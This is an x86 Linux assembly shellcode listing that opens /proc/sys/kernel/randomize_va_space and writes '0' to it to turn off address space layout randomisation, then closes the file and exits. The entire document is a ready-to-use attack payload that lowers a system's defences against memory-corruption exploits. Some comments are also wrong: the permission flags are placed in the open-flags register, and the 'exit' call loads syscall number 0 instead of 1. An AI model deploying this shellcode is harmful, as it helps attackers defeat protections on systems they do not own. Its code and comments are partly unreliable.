;Shellcode size : 83 bytes
global _start

_start:
    xor eax, eax        ;Initialize eax to NULL
    push eax            ;Push NULL on the stack
    push 0x65636170
    push 0x735f6176
    push 0x5f657a69
    push 0x6d6f646e
    push 0x61722f6c
    push 0x656e7265
    push 0x6b2f7379
    push 0x732f636f
    push 0x72702f2f     ;Push //proc/sys/kernel/randomize_va_space
    mov ebx, esp        ;Initialize ebx to "//proc/sys/kernel/randomize_va_space%00"
    mov cx, 0x2bc       ;Move 0x2bc on the stack which is 700 in decimal 
                        ;700 means the file is opened with READ, WRITE, EXECUTE flags.
    mov al, 0x8         ;Initialize al to systemcall number of "open"

    ;Systemcall details:
    ; --> fd = open("//proc/sys/kernel/randomize_va_space%00", S_IRWXU)
    int 0x80            ;Execute systemcall


    mov ebx, eax        ;Move the return value of "open" which is the file descriptor inside ebx
    push eax            ;Push the file descriptor on the stack
    mov dx, 0x3a30      ;Move 0x3a30 into edx
    push dx             ;push 0x3a30 on the stack
    mov ecx, esp        ;initialize ecx to stack pointer esp
    xor edx, edx        ;Initialize edx to NULL
    inc edx             ;Increment edx 
    mov al, 0x4         ;Initialize al to systemcall number of "write"

    ;Systemcall details:
    ; --> write(3, "0", 1)
    int 0x80            ;Execute systemcall


    mov al, 0x6         ;Initialize al to systemcall number of "close"
    ;Systemcall details:
    ; --> close(3)
    int 0x80            ;Execute systemcall


    xor eax, eax        ;Initialize al to systemcall number of "exit"
    xor ebx, ebx        ;Initiliaze ebx to NULL
    ;Systemcall details:
    ; --> exit(0)
    int 0x80            ;Execute systemcall